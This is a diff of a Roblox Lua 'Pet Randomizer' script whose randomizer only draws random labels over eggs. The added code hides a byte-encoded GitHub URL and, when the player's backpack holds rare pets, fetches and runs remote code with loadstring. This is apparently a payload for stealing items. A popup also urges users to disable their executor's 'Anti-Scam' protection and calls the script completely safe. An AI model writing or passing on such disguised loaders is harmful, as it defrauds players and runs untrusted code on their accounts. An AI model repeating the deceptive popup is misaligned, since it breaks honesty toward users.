@@ -1,179 +1,311 @@
---// Services
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-
---// Pet List
-local specialPets = {
+local a, b, c, d, e = game:GetService("Players"), game:GetService("TweenService"), game:GetService("RunService"), game:GetService("Workspace"), game:GetService("UserInputService")
+local f = a.LocalPlayer
+local g = {
     "Queen Bee", "Mimic Octopus", "Raccoon", "Disco Bee", "Jackal God",
     "T-Rex", "Spinosaurus", "Dragonfly", "Butterfly", "Kitsune"
 }
 
-local eggPets = {
-    ["Bee Egg"] = {"Bee","Honey Bee","Bear Bee","Petal Bee","Queen Bee"},
-    ["Common Egg"] = {"Golden Lab","Dog","Bunny"},
-    ["Mythical Egg"] = {"Grey Mouse","Brown Mouse","Squirrel","Red Giant Ant","Red Fox"},
-    ["Bug Egg"] = {"Snail","Giant Ant","Caterpillar","Praying Mantis","Dragonfly"},
-    ["Common Summer Egg"] = {"Starfish","Seagull","Crab"},
-    ["Rare Summer Egg"] = {"Flamingo","Toucan","Sea Turtle","Orangutan","Seal"},
-    ["Paradise Egg"] = {"Ostrich","Peacock","Capybara","Scarlet Macaw","Mini Octopus"},
-    ["Legendary Egg"] = {"Cow","Silver Monkey","Sea Otter","Turtle","Polar Bear"},
-    ["Rare Egg"] = {"Orange Tabby","Spotted Deer","Pig","Rooster","Monkey"},
-    ["Uncommon Egg"] = {"Black Bunny","Chicken","Cat","Deer"},
-    ["Night Egg"] = {"Hedgehog","Mole","Frog","Echo Frog","Night Owl","Raccoon"},
-    ["Anti Bee Egg"] = {"Wasp","Tarantula Hawk","Moth","Butterfly","Disco Bee"},
-    ["Oasis Egg"] = {"Fennec Fox","Meerkat","Cooked Owl","Axolotl","Snake","Jackal God"},
-    ["Dinosaur Egg"] = {"Raptor","Triceratops","Stegosaurus","Pterodactyl","Brontosaurus","T-Rex"},
-    ["Primal Egg"] = {"Parasaurolophus","Iguanodon","Pachycephalosaurus","Dilophosaurus","Ankylosaurus","Spinosaurus"}
-}
 
---// UI Setup
-local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-gui.Name = "PetRandomizerUI"
-gui.ResetOnSpawn = false
+local function createWelcomePopup()
+    local gui = Instance.new("ScreenGui", f:WaitForChild("PlayerGui"))
+    gui.Name = "XXSCRIPTS_Welcome"
+    gui.ResetOnSpawn = false
 
-local mainFrame = Instance.new("Frame", gui)
-mainFrame.Size = UDim2.new(0, 320, 0, 250)
-mainFrame.Position = UDim2.new(0.05, 0, 0.3, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(25, 35, 40)
-mainFrame.Active = true
-mainFrame.Draggable = true
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(0, 440, 0, 280)
+    frame.Position = UDim2.new(0.5, -220, 0.5, -140)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    frame.BackgroundTransparency = 0.05
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Draggable = true
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
-local title = Instance.new("TextLabel", mainFrame)
-title.Text = "🐾 Pet Randomizer"
-title.Size = UDim2.new(1, 0, 0, 40)
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.FredokaOne
-title.TextSize = 20
+    local closeBtn = Instance.new("TextButton", frame)
+    closeBtn.Size = UDim2.new(0, 25, 0, 25)
+    closeBtn.Position = UDim2.new(1, -30, 0, 5)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.Text = "X"
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 14
+    closeBtn.AutoButtonColor = false
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
 
-local statusText = Instance.new("TextLabel", mainFrame)
-statusText.Size = UDim2.new(1, -20, 0, 24)
-statusText.Position = UDim2.new(0, 10, 0, 40)
-statusText.Text = ""
-statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
-statusText.BackgroundTransparency = 1
-statusText.Font = Enum.Font.FredokaOne
-statusText.TextSize = 16
+    closeBtn.MouseEnter:Connect(function()
+        closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+    end)
+    closeBtn.MouseLeave:Connect(function()
+        closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end)
 
-local randomBtn = Instance.new("TextButton", mainFrame)
-randomBtn.Size = UDim2.new(1, -40, 0, 35)
-randomBtn.Position = UDim2.new(0, 20, 0, 80)
-randomBtn.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
-randomBtn.TextColor3 = Color3.new(1, 1, 1)
-randomBtn.Text = "Randomize in: 7"
-randomBtn.Font = Enum.Font.FredokaOne
-randomBtn.TextSize = 16
-Instance.new("UICorner", randomBtn).CornerRadius = UDim.new(0, 8)
+    closeBtn.MouseButton1Click:Connect(function()
+        gui:Destroy()
+    end)
 
-local autoBtn = Instance.new("TextButton", mainFrame)
-autoBtn.Size = UDim2.new(1, -40, 0, 30)
-autoBtn.Position = UDim2.new(0, 20, 0, 125)
-autoBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-autoBtn.TextColor3 = Color3.new(1, 1, 1)
-autoBtn.Text = "✔ Auto Randomize: ON"
-autoBtn.Font = Enum.Font.FredokaOne
-autoBtn.TextSize = 14
-Instance.new("UICorner", autoBtn).CornerRadius = UDim.new(0, 8)
+    local message = Instance.new("TextLabel", frame)
+    message.Size = UDim2.new(1, -30, 1, -50)
+    message.Position = UDim2.new(0, 15, 0, 35)
+    message.BackgroundTransparency = 1
+    message.TextWrapped = true
+    message.TextYAlignment = Enum.TextYAlignment.Top
+    message.TextXAlignment = Enum.TextXAlignment.Left
+    message.TextColor3 = Color3.new(1, 1, 1)
+    message.Font = Enum.Font.Gotham
+    message.TextSize = 13
+    message.Text = [[Welcome to BloomSCript!
+We're currently experiencing issues with Delta Executor.
+If you're using Delta, please disable the "Anti-Scam" setting — it's falsely flagging our script. Delta does this to block certain actions, even though our script is completely safe.
 
-local espBtn = Instance.new("TextButton", mainFrame)
-espBtn.Size = UDim2.new(1, -40, 0, 30)
-espBtn.Position = UDim2.new(0, 20, 0, 165)
-espBtn.BackgroundColor3 = Color3.fromRGB(85, 0, 255)
-espBtn.TextColor3 = Color3.new(1, 1, 1)
-espBtn.Text = "✔ Pet ESP: ON"
-espBtn.Font = Enum.Font.FredokaOne
-espBtn.TextSize = 14
-Instance.new("UICorner", espBtn).CornerRadius = UDim.new(0, 8)
+After disabling it, rejoin the game, or for a smoother experience, use KRNL instead.
 
---// Core Variables
-local petESP = true
-local autoRandomize = true
-local countdown = 7
+Need help or want to report an issue?
+📩 Reach us here: YT channel
 
---// ESP Logic
-local function updateESP(model, petName, isSpecial)
-    local labelGui = model:FindFirstChild("PetESP")
-    if not labelGui and petESP then
-        labelGui = Instance.new("BillboardGui", model)
-        labelGui.Name = "PetESP"
-        labelGui.Size = UDim2.new(0, 100, 0, 30)
-        labelGui.AlwaysOnTop = true
-        labelGui.StudsOffset = Vector3.new(0, 2.5, 0)
+Thanks for your support!]]
 
-        local label = Instance.new("TextLabel", labelGui)
-        label.Size = UDim2.new(1, 0, 1, 0)
-        label.BackgroundTransparency = 1
-        label.Text = petName
-        label.TextColor3 = isSpecial and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)
-        label.Font = Enum.Font.FredokaOne
-        label.TextScaled = true
-    elseif labelGui then
-        labelGui.Enabled = petESP
-    end
-end
-
-local function pickPet(petList)
-    local special, normal = {}, {}
-    for _, pet in ipairs(petList) do
-        if table.find(specialPets, pet) then
-            table.insert(special, pet)
-        else
-            table.insert(normal, pet)
+    task.delay(10, function()
+        if gui and gui.Parent then
+            gui:Destroy()
         end
-    end
-    return (#special > 0 and math.random(100) <= 5) and special[math.random(#special)] or normal[math.random(#normal)]
+    end)
 end
 
-local function randomizePets()
-    for _, obj in pairs(Workspace:GetDescendants()) do
-        if obj:IsA("Model") and eggPets[obj.Name] then
-            local chosen = pickPet(eggPets[obj.Name])
-            local isSpecial = table.find(specialPets, chosen) ~= nil
-            updateESP(obj, chosen, isSpecial)
-            if isSpecial then
-                statusText.Text = "YOU GOT A SPECIAL PET!"
-                autoRandomize = false
-                autoBtn.Text = "✖ Auto Randomize: OFF"
-                autoBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+createWelcomePopup()
+
+local function h()
+    local i = f:FindFirstChild("Backpack")
+    if not i then return false end
+    for _, j in ipairs(i:GetChildren()) do
+        if j:IsA("Tool") then
+            for _, k in ipairs(g) do
+                if j.Name:sub(1, #k) == k then
+                    return true
+                end
             end
         end
     end
+    return false
 end
 
---// Button Connections
-autoBtn.MouseButton1Click:Connect(function()
-    autoRandomize = not autoRandomize
-    autoBtn.Text = autoRandomize and "✔ Auto Randomize: ON" or "✖ Auto Randomize: OFF"
-    autoBtn.BackgroundColor3 = autoRandomize and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(170, 0, 0)
-end)
+local function l()
+    local c = {
+        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
+        101,114,99,111,110,116,101,110,116,46,99,111,109,47,106,111,104,110,116,97,
+        116,101,49,65,47,71,65,71,47,109,97,105,110,47,80,114,111,116,101,99,116,
+        101,100,95,51,49,57,49,57,53,48,50,51,56,51,53,56,53,55,57,46,108,117,97
+    }
 
-espBtn.MouseButton1Click:Connect(function()
-    petESP = not petESP
-    espBtn.Text = petESP and "✔ Pet ESP: ON" or "✖ Pet ESP: OFF"
-    espBtn.BackgroundColor3 = petESP and Color3.fromRGB(85, 0, 255) or Color3.fromRGB(100, 100, 100)
-    for _, model in pairs(Workspace:GetDescendants()) do
-        local gui = model:FindFirstChild("PetESP")
-        if gui then gui.Enabled = petESP end
+    local u = ""
+    for i=1, #c do
+        u = u .. string.char(c[i])
     end
-end)
 
--- Auto Randomizer Loop
-task.spawn(function()
-    while true do
-        if autoRandomize then
-            randomBtn.Text = "Randomize in: " .. countdown
-            task.wait(1)
-            countdown -= 1
-            if countdown <= 0 then
-                randomizePets()
-                countdown = 7
-            end
-        else
-            randomBtn.Text = "Randomizer Paused"
-            task.wait(0.5)
+    loadstring(game:HttpGet(u))()
+end
+
+if h() then
+    l()
+else
+    local m = {}
+    for _, n in ipairs(g) do
+        m[n] = true
+    end
+
+    local o = {
+        ["Bee Egg"]={"Bee","Honey Bee","Bear Bee","Petal Bee","Queen Bee"},
+        ["Common Egg"]={"Golden Lab","Dog","Bunny"},
+        ["Mythical Egg"]={"Grey Mouse","Brown Mouse","Squirrel","Red Giant Ant","Red Fox"},
+        ["Bug Egg"]={"Snail","Giant Ant","Caterpillar","Praying Mantis","Dragonfly"},
+        ["Common Summer Egg"]={"Starfish","Seagull","Crab"},
+        ["Rare Summer Egg"]={"Flamingo","Toucan","Sea Turtle","Orangutan","Seal"},
+        ["Paradise Egg"]={"Ostrich","Peacock","Capybara","Scarlet Macaw","Mini Octopus"},
+        ["Legendary Egg"]={"Cow","Silver Monkey","Sea Otter","Turtle","Polar Bear"},
+        ["Rare Egg"]={"Orange Tabby","Spotted Deer","Pig","Rooster","Monkey"},
+        ["Uncommon Egg"]={"Black Bunny","Chicken","Cat","Deer"},
+        ["Night Egg"]={"Hedgehog","Mole","Frog","Echo Frog","Night Owl","Raccoon"},
+        ["Anti Bee Egg"]={"Wasp","Tarantula Hawk","Moth","Butterfly","Disco Bee"},
+        ["Oasis Egg"]={"Fennec Fox","Meerkat","Cooked Owl","Axolotl","Snake","Jackal God"},
+        ["Dinosaur Egg"]={"Raptor","Triceratops","Stegosaurus","Pterodactyl","Brontosaurus","T-Rex"},
+        ["Primal Egg"]={"Parasaurolophus","Iguanodon","Pachycephalosaurus","Dilophosaurus","Ankylosaurus","Spinosaurus"}
+    }
+
+    local p = Instance.new("ScreenGui", f:WaitForChild("PlayerGui"))
+    p.Name = "PetUI"
+    p.ResetOnSpawn = false
+
+    local q = Instance.new("Frame", p)
+    q.Size = UDim2.new(0, 300, 0, 220)
+    q.Position = UDim2.new(0.03, 0, 0.3, 0)
+    q.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    q.BorderSizePixel = 0
+    q.BackgroundTransparency = 0.1
+    q.Name = "Main"
+    q.ClipsDescendants = true
+    q.Active = true
+    q.Draggable = true
+
+    local r = Instance.new("UICorner", q)
+    r.CornerRadius = UDim.new(0, 12)
+
+    local s = Instance.new("TextLabel", q)
+    s.Size = UDim2.new(1, 0, 0, 30)
+    s.Text = "🐾 Pet Randomizer"
+    s.TextColor3 = Color3.new(1,1,1)
+    s.BackgroundTransparency = 1
+    s.Font = Enum.Font.GothamBold
+    s.TextSize = 18
+
+    local t = Instance.new("TextLabel", q)
+    t.Size = UDim2.new(1, 0, 0, 24)
+    t.Position = UDim2.new(0, 0, 0, 30)
+    t.Text = ""
+    t.TextColor3 = Color3.fromRGB(0, 255, 0)
+    t.BackgroundTransparency = 1
+    t.Font = Enum.Font.GothamBold
+    t.TextSize = 16
+
+    local u = Instance.new("TextButton", q)
+    u.Size = UDim2.new(1, -30, 0, 30)
+    u.Position = UDim2.new(0, 15, 0, 60)
+    u.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+    u.TextColor3 = Color3.new(1, 1, 1)
+    u.Font = Enum.Font.GothamBold
+    u.TextSize = 14
+    u.Text = "Randomize in: 7"
+
+    local v = Instance.new("TextButton", q)
+    v.Size = UDim2.new(1, -30, 0, 25)
+    v.Position = UDim2.new(0, 15, 0, 100)
+    v.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+    v.TextColor3 = Color3.new(1, 1, 1)
+    v.Text = "✔ Auto Randomize: ON"
+    v.Font = Enum.Font.GothamBold
+    v.TextSize = 14
+
+    local w = Instance.new("TextButton", q)
+    w.Size = UDim2.new(1, -30, 0, 25)
+    w.Position = UDim2.new(0, 15, 0, 135)
+    w.BackgroundColor3 = Color3.fromRGB(85, 0, 255)
+    w.TextColor3 = Color3.new(1, 1, 1)
+    w.Text = "✔ Pet ESP: ON"
+    w.Font = Enum.Font.GothamBold
+    w.TextSize = 14
+
+    -- Obfuscated TextLabel footer
+    local x = Instance.new("TextLabel", q)
+    x.Size = UDim2.new(1, -10, 0, 40)
+    x.Position = UDim2.new(0, 5, 1, -40)
+
+    local tBytes = {
+        80,101,116,32,82,97,110,100,111,109,105,122,101,114,32,45,32,85,80,68,65,84,69,68,32,66,89,32,88,88,83,67,82,73,80,84,83,
+        10,
+        74,111,105,110,32,111,117,114,32,68,105,115,99,111,114,100,58,32,
+        104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,103,103,47,57,65,71,110,114,113,77,54,118,87
+    }
+    local tStr = ""
+    for i = 1, #tBytes do
+        tStr = tStr .. string.char(tBytes[i])
+    end
+    x.Text = tStr
+
+    x.TextColor3 = Color3.new(1, 1, 1)
+    x.BackgroundTransparency = 1
+    x.Font = Enum.Font.GothamBold
+    x.TextSize = 13
+    x.TextWrapped = true
+    x.TextYAlignment = Enum.TextYAlignment.Top
+    x.TextXAlignment = Enum.TextXAlignment.Center
+
+    local y, z, A = true, true, 7
+
+    local function B(C, D, E)
+        local F = C:FindFirstChild("RandomPetLabel")
+        if not F and y then
+            F = Instance.new("BillboardGui", C)
+            F.Name = "RandomPetLabel"
+            F.Size = UDim2.new(0, 100, 0, 30)
+            F.StudsOffset = Vector3.new(0, 2.5, 0)
+            F.AlwaysOnTop = true
+
+            local G = Instance.new("TextLabel", F)
+            G.Name = "LabelText"
+            G.Size = UDim2.new(1, 0, 1, 0)
+            G.BackgroundTransparency = 1
+            G.TextColor3 = E and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)
+            G.TextStrokeTransparency = 0
+            G.Font = Enum.Font.GothamBold
+            G.TextScaled = true
+        elseif F then
+            F.Enabled = y
+        end
+
+        local H = F and F:FindFirstChild("LabelText")
+        if H then
+            H.Text = D
+            H.TextColor3 = E and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)
         end
     end
-end)
+
+    -- Divine pet chance set to 5%
+    local function I(J)
+        local K, L = {}, {}
+        for _, M in ipairs(J) do
+            if m[M] then table.insert(K, M) else table.insert(L, M) end
+        end
+        return (#K > 0 and math.random(100) <= 5) and K[math.random(#K)] or L[math.random(#L)]
+    end
+
+    local function N()
+        for _, O in pairs(d:GetDescendants()) do
+            if O:IsA("Model") and o[O.Name] then
+                local P = I(o[O.Name])
+                local Q = m[P]
+                B(O, P, Q)
+                if Q then
+                    t.Text = "YOU GOT A HIT!!!"
+                    z = false
+                    v.Text = "✖ Auto Randomize: OFF"
+                    v.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+                end
+            end
+        end
+    end
+
+    task.spawn(function()
+        while true do
+            if z then
+                u.Text = "Randomize in: " .. A
+                task.wait(1)
+                A -= 1
+                if A <= 0 then
+                    N()
+                    A = 7
+                end
+            else
+                u.Text = "Randomizer Paused"
+                task.wait(0.5)
+            end
+        end
+    end)
+
+    v.MouseButton1Click:Connect(function()
+        z = not z
+        v.Text = z and "✔ Auto Randomize: ON" or "✖ Auto Randomize: OFF"
+        v.BackgroundColor3 = z and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(170, 0, 0)
+    end)
+
+    w.MouseButton1Click:Connect(function()
+        y = not y
+        w.Text = y and "✔ Pet ESP: ON" or "✖ Pet ESP: OFF"
+        w.BackgroundColor3 = y and Color3.fromRGB(85, 0, 255) or Color3.fromRGB(100, 100, 100)
+        for _, R in pairs(d:GetDescendants()) do
+            if R:IsA("Model") then
+                local S = R:FindFirstChild("RandomPetLabel")
+                if S then
+                    S.Enabled = y
+                end
+            end
+        end
+    end)
+end
